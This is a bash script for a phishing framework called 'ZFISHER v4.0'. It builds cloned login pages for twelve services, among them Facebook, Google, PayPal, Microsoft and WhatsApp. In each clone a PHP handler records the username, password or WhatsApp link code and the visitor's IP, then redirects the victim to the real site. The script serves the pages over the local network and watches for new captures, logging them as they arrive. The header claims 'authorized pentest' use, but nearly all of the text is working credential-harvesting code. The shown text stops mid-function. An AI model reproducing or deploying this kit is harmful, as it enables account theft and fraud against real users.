#!/bin/bash

#============================================================#
#  ZFISHER v4.0 — KENZO FISHER PHISHING FRAMEWORK           #
#  Localhost Credential Harvesting — Authorized Pentest     #
#============================================================#

# Colors
R='\033[1;91m'; G='\033[1;92m'; Y='\033[1;93m'
B='\033[1;94m'; M='\033[1;95m'; C='\033[1;96m'
W='\033[1;97m'; NC='\033[0m'

# Paths
BASE_DIR="$HOME/.zfisher"
SITES_DIR="$BASE_DIR/sites"
LOG_DIR="$BASE_DIR/logs"
SERVER_PID=""
PORT=8080

#-------- Banner --------
banner() {
    clear
    echo -e "${R}"
    cat << "EOF"
    ███████╗███████╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ╚══███╔╝╚══███╔╝██║██╔════╝██║  ██║██╔════╝██╔══██╗
      ███╔╝   ███╔╝ ██║█████╗  ███████║█████╗  ██████╔╝
     ███╔╝   ███╔╝  ██║██╔══╝  ██╔══██║██╔══╝  ██╔══██╗
    ███████╗███████╗██║██║     ██║  ██║███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${M}   ╦╔═╗╔╗╔╔═╗╦═╗╦╔╦╗  ╔═╗╦═╗╦╔═╗╦═╗╔═╗${NC}"
    echo -e "${M}   ║║╣ ║║║║╣ ╠╦╝║ ║║  ╠═╣╠╦╝║║ ║╠╦╝╚═╗${NC}"
    echo -e "${M}  ╚╝╚═╝╝╚╝╚═╝╩╚═╩═╩╝  ╩ ╩╩╚═╩╚═╝╩╚═╚═╝${NC}"
    echo ""
    echo -e "${Y}         ═══════════════════════════════════${NC}"
    echo -e "${G}         👑  Welcome Sir  👑${NC}"
    echo -e "${Y}         ═══════════════════════════════════${NC}"
    echo -e "${C}     Phishing Framework | Localhost | Multi-Platform${NC}"
    echo -e "${R}     Creado por: KENZO FISHER${NC}"
    echo ""
}

#-------- Setup --------
setup_dirs() {
    mkdir -p "$SITES_DIR" "$LOG_DIR"
    mkdir -p "$SITES_DIR"/{facebook,instagram,google,twitter,linkedin,netflix,microsoft,github,paypal,whatsapp,amazon,spotify}
}

check_deps() {
    echo -e "${Y}[*] Checking dependencies...${NC}"
    for dep in php curl; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${Y}[*] Installing $dep...${NC}"
            pkg install "$dep" -y >/dev/null 2>&1
        fi
    done
    echo -e "${G}[✔] Dependencies OK${NC}"
}

#-------- Stop server --------
stop_server() {
    if [[ -n "$SERVER_PID" ]]; then
        kill "$SERVER_PID" 2>/dev/null
        SERVER_PID=""
    fi
    pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null
}

#-------- Create pages (all platforms) --------
create_all_pages() {

# ===== FACEBOOK =====
cat > "$SITES_DIR/facebook/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook – log in or sign up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:100%;max-width:396px}
h1{color:#1877f2;font-size:40px;text-align:center;margin-bottom:10px;font-weight:700}
p{text-align:center;color:#606770;margin-bottom:20px;font-size:15px}
input{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
input:focus{border-color:#1877f2}
button{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:700;margin-top:10px;cursor:pointer}
button:hover{background:#166fe5}
.forgot{display:block;text-align:center;color:#1877f2;margin-top:16px;font-size:14px;text-decoration:none}
.line{border-bottom:1px solid #dadde1;margin:20px 0}
.create{display:block;width:fit-content;margin:0 auto;background:#42b72a;color:#fff;padding:12px 16px;border-radius:6px;text-decoration:none;font-weight:700;font-size:17px}
</style>
</head>
<body>
<div class="box">
<h1>facebook</h1>
<p>Facebook helps you connect and share with the people in your life.</p>
<form method="POST" action="login.php">
<input type="text" name="email" placeholder="Email address or phone number" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<a class="forgot" href="#">Forgotten password?</a>
<div class="line"></div>
<a class="create" href="#">Create New Account</a>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/facebook/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Facebook\nEmail/User: " . $_POST['email'] . "\nPass: " . $_POST['pass'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://www.facebook.com/");
exit();
?>
PHPEOF

# ===== INSTAGRAM =====
cat > "$SITES_DIR/instagram/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;width:100%;max-width:350px;text-align:center}
.logo{font-family:"Segoe Script",cursive;font-size:42px;margin-bottom:30px;font-weight:500}
input{width:100%;padding:10px;margin:4px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;outline:none}
button{width:100%;background:#0095f6;color:#fff;border:none;border-radius:4px;padding:8px;font-size:14px;font-weight:600;margin-top:12px;cursor:pointer}
.or{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.or::before,.or::after{content:"";flex:1;border-bottom:1px solid #dbdbdb}
.or span{padding:0 18px}
.fb{color:#385185;font-weight:600;font-size:14px;text-decoration:none;display:block;margin:10px 0}
.forgot{color:#00376b;font-size:12px;text-decoration:none}
.signup{background:#fff;border:1px solid #dbdbdb;padding:20px;margin-top:10px;width:100%;max-width:350px;text-align:center;font-size:14px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div>
<div class="box">
<div class="logo">Instagram</div>
<form method="POST" action="login.php">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="or"><span>OR</span></div>
<a class="fb" href="#">Log in with Facebook</a>
<a class="forgot" href="#">Forgot password?</a>
</div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/instagram/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Instagram\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://www.instagram.com/");
exit();
?>
PHPEOF

# ===== GOOGLE =====
cat > "$SITES_DIR/google/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:"Google Sans",Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:100%;max-width:450px}
.logo{text-align:center;margin-bottom:16px}
.logo svg{width:75px}
h1{font-size:24px;font-weight:400;text-align:center;color:#202124}
.sub{font-size:16px;text-align:center;color:#202124;margin:8px 0 30px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;margin:8px 0}
input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
.links{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.links a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
button:hover{background:#1765cc;box-shadow:0 1px 2px rgba(0,0,0,.3)}
</style>
</head>
<body>
<div class="box">
<div class="logo">
<svg viewBox="0 0 75 24"><path fill="#4285F4" d="M73 12.2c0-.6 0-1.2-.1-1.8H37.5v3.4h19.9c-.9 4.3-3.7 7.4-7.7 9.2v3.5h5c2.9-2.7 4.6-6.7 4.6-11.4 0-1-.1-1.9-.3-2.9z"/><path fill="#34A853" d="M37.5 24c5.2 0 9.5-1.7 12.6-4.6l-5-3.5c-1.4.9-3.2 1.5-5.4 1.5-4.2 0-7.7-2.8-9-6.6H12.8v3.6C16 21.3 26.1 24 37.5 24z"/><path fill="#FBBC05" d="M21 14.1c-.7-2-1.1-4.1-1.1-6.3s.4-4.3 1.1-6.3V0H12.8C9.1 4.6 7 10 7 16s2.1 11.4 5.8 16l8.2-6.4z"/><path fill="#EA4335" d="M37.5 4.5c2.7 0 5.2.9 7.1 2.7l5.3-5.3C45 0.7 41 0 37.5 0 28.5 0 20.7 4.2 15.8 10.5l7.7 6c1.3-3.8 4.8-6.6 9-6.6z"/></svg>
</div>
<h1>Sign in</h1>
<p class="sub">Use your Google Account</p>
<form method="POST" action="login.php">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<div class="links">
<a href="#">Forgot email?</a>
<button type="submit">Next</button>
</div>
</form>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/google/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Google\nEmail: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://accounts.google.com/");
exit();
?>
PHPEOF

# ===== TWITTER / X =====
cat > "$SITES_DIR/twitter/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to X / Twitter</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:32px;width:100%;max-width:400px}
.xlogo{font-size:36px;text-align:center;margin-bottom:20px;font-weight:900}
h1{font-size:28px;font-weight:700;margin-bottom:24px}
input{width:100%;padding:16px;margin:8px 0;background:transparent;border:1px solid #333;border-radius:4px;font-size:16px;color:#e7e9ea;outline:none}
input:focus{border-color:#1d9bf0}
button{width:100%;background:#fff;color:#0f1419;border:none;border-radius:9999px;padding:14px;font-size:16px;font-weight:700;margin-top:16px;cursor:pointer}
button:hover{background:#e7e9ea}
.forgot{display:block;text-align:center;color:#1d9bf0;margin-top:20px;text-decoration:none;font-size:14px}
</style>
</head>
<body>
<div class="box">
<div class="xlogo">𝕏</div>
<h1>Sign in to X</h1>
<form method="POST" action="login.php">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>
<a class="forgot" href="#">Forgot password?</a>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/twitter/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Twitter/X\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://twitter.com/");
exit();
?>
PHPEOF

# ===== LINKEDIN =====
cat > "$SITES_DIR/linkedin/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkedIn Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f3f2ef;font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.15);padding:24px;width:100%;max-width:400px}
.logo{color:#0a66c2;font-size:32px;font-weight:700;margin-bottom:8px}
h1{font-size:28px;font-weight:600;color:#1d1d1d;margin-bottom:8px}
.sub{color:#666;margin-bottom:24px;font-size:14px}
label{display:block;font-size:14px;color:#666;margin-top:12px}
input{width:100%;padding:12px;margin-top:4px;border:1px solid #ccc;border-radius:4px;font-size:16px;outline:none}
input:focus{border-color:#0a66c2;box-shadow:0 0 0 1px #0a66c2}
button{width:100%;background:#0a66c2;color:#fff;border:none;border-radius:24px;padding:14px;font-size:16px;font-weight:600;margin-top:20px;cursor:pointer}
button:hover{background:#004182}
a{color:#0a66c2;text-decoration:none;font-size:14px;font-weight:600}
</style>
</head>
<body>
<div class="box">
<div class="logo">in</div>
<h1>Sign in</h1>
<p class="sub">Stay updated on your professional world</p>
<form method="POST" action="login.php">
<label>Email or Phone</label>
<input type="text" name="email" required>
<label>Password</label>
<input type="password" name="password" required>
<br><br><a href="#">Forgot password?</a>
<button type="submit">Sign in</button>
</form>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/linkedin/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "LinkedIn\nEmail: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://www.linkedin.com/");
exit();
?>
PHPEOF

# ===== NETFLIX =====
cat > "$SITES_DIR/netflix/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netflix</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:"Netflix Sans",Helvetica,Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;background-image:linear-gradient(rgba(0,0,0,.6),rgba(0,0,0,.6)),url('https://assets.nflxext.com/ffe/siteui/vlv3/93da5c27-be66-427c-8b72-5cb39d275279/94eb5ad7-10d8-4cca-bf45-ac52e0a052c0/IN-en-20240226-popsignuptwoweeks-perspective_alpha_website_large.jpg');background-size:cover}
.box{background:rgba(0,0,0,.75);padding:60px 68px 40px;width:100%;max-width:450px;border-radius:4px}
h1{color:#fff;font-size:32px;margin-bottom:28px;font-weight:500}
input{width:100%;padding:16px 20px;margin:8px 0;background:#333;border:none;border-radius:4px;font-size:16px;color:#fff;outline:none}
input:focus{background:#454545}
button{width:100%;background:#e50914;color:#fff;border:none;border-radius:4px;padding:16px;font-size:16px;font-weight:700;margin-top:24px;cursor:pointer}
button:hover{background:#f40612}
.help{display:flex;justify-content:space-between;margin-top:12px;color:#b3b3b3;font-size:13px}
.help a{color:#b3b3b3;text-decoration:none}
.signup{color:#737373;margin-top:40px;font-size:16px}
.signup a{color:#fff;text-decoration:none}
</style>
</head>
<body>
<div class="box">
<h1>Sign In</h1>
<form method="POST" action="login.php">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="help">
<label><input type="checkbox"> Remember me</label>
<a href="#">Need help?</a>
</div>
<p class="signup">New to Netflix? <a href="#">Sign up now</a></p>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/netflix/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Netflix\nEmail: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://www.netflix.com/");
exit();
?>
PHPEOF

# ===== MICROSOFT =====
cat > "$SITES_DIR/microsoft/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your Microsoft account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f2f2f2;font-family:"Segoe UI",Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;padding:44px;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{margin-bottom:16px}
.logo span{font-size:18px;font-weight:600}
h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none;margin:12px 0}
input:focus{border-bottom:2px solid #0067b8}
a{color:#0067b8;text-decoration:none;font-size:13px}
.btn-row{display:flex;justify-content:flex-end;margin-top:24px}
button{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;cursor:pointer}
button:hover{background:#005da6}
</style>
</head>
<body>
<div class="box">
<div class="logo"><span style="color:#f25022">■</span><span style="color:#7fba00">■</span><span style="color:#00a4ef">■</span><span style="color:#ffb900">■</span> Microsoft</div>
<h1>Sign in</h1>
<form method="POST" action="login.php">
<input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<br><a href="#">Forgot password?</a><br><br>
<a href="#">No account? Create one!</a>
<div class="btn-row"><button type="submit">Next</button></div>
</form>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/microsoft/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Microsoft\nEmail: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://login.live.com/");
exit();
?>
PHPEOF

# ===== GITHUB =====
cat > "$SITES_DIR/github/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to GitHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#c9d1d9}
.box{width:100%;max-width:340px}
.logo{text-align:center;font-size:48px;margin-bottom:16px}
h1{text-align:center;font-size:24px;font-weight:300;margin-bottom:20px;color:#c9d1d9}
.form-box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:20px}
label{display:block;font-size:14px;font-weight:600;margin-bottom:8px;margin-top:12px}
input{width:100%;padding:5px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;line-height:20px;outline:none}
input:focus{border-color:#58a6ff;box-shadow:0 0 0 3px rgba(31,111,235,.3)}
button{width:100%;background:#238636;color:#fff;border:1px solid rgba(240,246,252,.1);border-radius:6px;padding:5px 16px;font-size:14px;font-weight:500;margin-top:16px;cursor:pointer;line-height:20px}
button:hover{background:#2ea043}
.footer{border:1px solid #30363d;border-radius:6px;padding:16px;text-align:center;margin-top:16px;font-size:14px}
.footer a{color:#58a6ff;text-decoration:none}
</style>
</head>
<body>
<div class="box">
<div class="logo">🐙</div>
<h1>Sign in to GitHub</h1>
<div class="form-box">
<form method="POST" action="login.php">
<label>Username or email address</label>
<input type="text" name="username" required>
<label>Password</label>
<input type="password" name="password" required>
<button type="submit">Sign in</button>
</form>
</div>
<div class="footer">New to GitHub? <a href="#">Create an account</a></div>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/github/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "GitHub\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://github.com/login");
exit();
?>
PHPEOF

# ===== PAYPAL =====
cat > "$SITES_DIR/paypal/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to your PayPal account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:"PayPal Open",Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:100%;max-width:400px;padding:20px;text-align:center}
.logo{color:#003087;font-size:40px;font-weight:700;margin-bottom:30px;font-style:italic}
input{width:100%;padding:14px 12px;margin:8px 0;border:1px solid #9da3a6;border-radius:4px;font-size:16px;outline:none}
input:focus{border-color:#0070ba;box-shadow:0 0 0 1px #0070ba}
button{width:100%;background:#0070ba;color:#fff;border:none;border-radius:24px;padding:14px;font-size:16px;font-weight:700;margin-top:16px;cursor:pointer}
button:hover{background:#005ea6}
.or{margin:20px 0;color:#6c7378;font-size:14px}
.signup{width:100%;background:#fff;color:#2c2e2f;border:1px solid #2c2e2f;border-radius:24px;padding:14px;font-size:16px;font-weight:700;cursor:pointer;display:block;text-decoration:none}
a.link{color:#0070ba;text-decoration:none;font-size:14px;display:block;margin-top:16px}
</style>
</head>
<body>
<div class="box">
<div class="logo">PayPal</div>
<form method="POST" action="login.php">
<input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<a class="link" href="#">Having trouble logging in?</a>
<div class="or">or</div>
<a class="signup" href="#">Sign Up</a>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/paypal/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "PayPal\nEmail: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://www.paypal.com/");
exit();
?>
PHPEOF

# ===== WHATSAPP =====
cat > "$SITES_DIR/whatsapp/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#111b21;font-family:Segoe UI,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e9edef}
.box{background:#202c33;border-radius:8px;padding:40px;width:100%;max-width:420px;text-align:center}
.logo{font-size:60px;margin-bottom:16px}
h1{font-size:24px;font-weight:300;margin-bottom:8px}
.sub{color:#8696a0;font-size:14px;margin-bottom:28px}
input{width:100%;padding:14px 16px;margin:8px 0;background:#2a3942;border:none;border-radius:8px;font-size:16px;color:#e9edef;outline:none}
input:focus{outline:2px solid #00a884}
button{width:100%;background:#00a884;color:#111b21;border:none;border-radius:24px;padding:14px;font-size:16px;font-weight:600;margin-top:16px;cursor:pointer}
button:hover{background:#06cf9c}
</style>
</head>
<body>
<div class="box">
<div class="logo">💬</div>
<h1>WhatsApp Web</h1>
<p class="sub">Enter phone & verification code to link device</p>
<form method="POST" action="login.php">
<input type="text" name="phone" placeholder="Phone number (+91...)" required>
<input type="text" name="code" placeholder="6-digit code" required>
<button type="submit">Link Device</button>
</form>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/whatsapp/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "WhatsApp\nPhone: " . $_POST['phone'] . "\nCode: " . $_POST['code'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://web.whatsapp.com/");
exit();
?>
PHPEOF

# ===== AMAZON =====
cat > "$SITES_DIR/amazon/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Amazon Sign-In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:"Amazon Ember",Arial,sans-serif;display:flex;justify-content:center;padding-top:20px;min-height:100vh}
.box{width:100%;max-width:350px;border:1px solid #ddd;border-radius:4px;padding:20px 26px;margin-top:20px}
.logo{text-align:center;font-size:28px;font-weight:700;color:#131921;margin-bottom:16px}
.logo span{color:#ff9900}
h1{font-size:28px;font-weight:400;margin-bottom:16px}
label{display:block;font-size:13px;font-weight:700;margin-bottom:4px;margin-top:12px}
input{width:100%;padding:8px;border:1px solid #a6a6a6;border-radius:3px;font-size:14px;outline:none;box-shadow:0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset}
input:focus{border-color:#e77600;box-shadow:0 0 3px 2px rgba(228,121,17,.5)}
button{width:100%;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;padding:8px;font-size:13px;margin-top:16px;cursor:pointer}
button:hover{background:linear-gradient(to bottom,#f5d78e,#eeb933)}
a{color:#0066c0;text-decoration:none;font-size:13px}
</style>
</head>
<body>
<div>
<div class="logo">amazon<span>.in</span></div>
<div class="box">
<h1>Sign in</h1>
<form method="POST" action="login.php">
<label>Email or mobile phone number</label>
<input type="text" name="email" required>
<label>Password</label>
<input type="password" name="password" required>
<button type="submit">Continue</button>
</form>
<br><a href="#">Forgot password?</a>
</div>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/amazon/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Amazon\nEmail: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://www.amazon.in/");
exit();
?>
PHPEOF

# ===== SPOTIFY =====
cat > "$SITES_DIR/spotify/index.php" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login - Spotify</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#121212;font-family:CircularSp,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
.box{width:100%;max-width:450px;padding:20px;text-align:center}
.logo{font-size:40px;margin-bottom:24px;color:#1db954}
h1{font-size:28px;font-weight:700;margin-bottom:32px}
input{width:100%;padding:14px;margin:8px 0;background:#121212;border:1px solid #727272;border-radius:4px;font-size:16px;color:#fff;outline:none}
input:focus{border-color:#fff}
button{width:100%;background:#1db954;color:#000;border:none;border-radius:500px;padding:16px;font-size:16px;font-weight:700;margin-top:24px;cursor:pointer}
button:hover{background:#1ed760;transform:scale(1.02)}
a{color:#fff;text-decoration:underline;font-size:14px}
</style>
</head>
<body>
<div class="box">
<div class="logo">♫ Spotify</div>
<h1>Log in to Spotify</h1>
<form method="POST" action="login.php">
<input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<br><br><a href="#">Forgot your password?</a>
</div>
</body>
</html>
HTMLEOF

cat > "$SITES_DIR/spotify/login.php" << 'PHPEOF'
<?php
file_put_contents("usernames.txt", "Spotify\nEmail: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n---\n", FILE_APPEND);
header("Location: https://www.spotify.com/");
exit();
?>
PHPEOF

    echo -e "${G}[✔] All phishing pages created!${NC}"
}

#-------- Start phishing --------
start_phish() {
    local site="$1"
    local site_path="$SITES_DIR/$site"

    if [[ ! -d "$site_path" ]]; then
        echo -e "${R}[-] Site not found!${NC}"
        return
    fi

    # Clear old captures for this session
    : > "$site_path/usernames.txt" 2>/dev/null

    stop_server
    cd "$site_path" || return

    php -S 127.0.0.1:$PORT >/dev/null 2>&1 &
    SERVER_PID=$!
    sleep 1

    clear
    banner
    echo -e "${G}╔════════════════════════════════════════════╗${NC}"
    echo -e "${G}║${NC}  ${Y}TARGET:${NC}  ${C}$site${NC}"
    echo -e "${G}║${NC}  ${Y}STATUS:${NC}  ${G}RUNNING${NC}"
    echo -e "${G}║${NC}  ${Y}LOCAL:${NC}   ${W}http://127.0.0.1:$PORT${NC}"
    echo -e "${G}╚════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${Y}[*] Waiting for credentials... (Ctrl+C to stop)${NC}"
    echo -e "${C}[*] Open browser: ${W}http://127.0.0.1:$PORT${NC}"
    echo -e "${C}[*] Same WiFi pe phone se lagao: ${W}http://$(ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo 'YOUR_IP'):$PORT${NC}"
    echo ""
    echo -e "${R}────────── CAPTURED CREDENTIALS ──────────${NC}"

    # Monitor file
    local last_size=0
    while true; do
        if [[ -f "$site_path/usernames.txt" ]]; then
            local cur_size
            cur_size=$(wc -c < "$site_path/usernames.txt" 2>/dev/null || echo 0)
            if [[ "$cur_size" -gt "$last_size" ]]; then
                echo -e "${G}"
                tail -n 6 "$site_path/usernames.txt"
                echo -e "${NC}"
                # Also save to central log
                cat "$site_path/usernames.txt" >> "$LOG_DIR/captured.txt"
                last_size=$cur_size
                echo -e "${Y}[+] Saved to $LOG_DIR/captured.txt${NC}"
                echo -e "${R}──────────────────────────────────────────${NC}"
            fi
        fi
        sleep 1
    done
}

#-------- View captures --------
view_captures() {
    clear
    banner
    echo -e "${Y}════════ CAPTURED CREDENTIALS ════════${NC}\n"
    if [[ -f "$LOG_DIR/captured.txt" ]] && [[ -s "$LOG_DIR/captured.txt" ]]; then
        cat "$LOG_DIR/captured.txt"
    else
        # Also check individual sites
        found=0
        for f in "$SITES_DIR"/*/usernames.txt; do
            if [[ -f "$f" ]] && [[ -s "$f" ]]; then
                cat "$f"
                found=1
            fi
        done
        if [[ $found -eq 0 ]]; then
            echo -e "${R}[-] No credentials captured yet.${NC}"
        fi
    fi
    echo ""
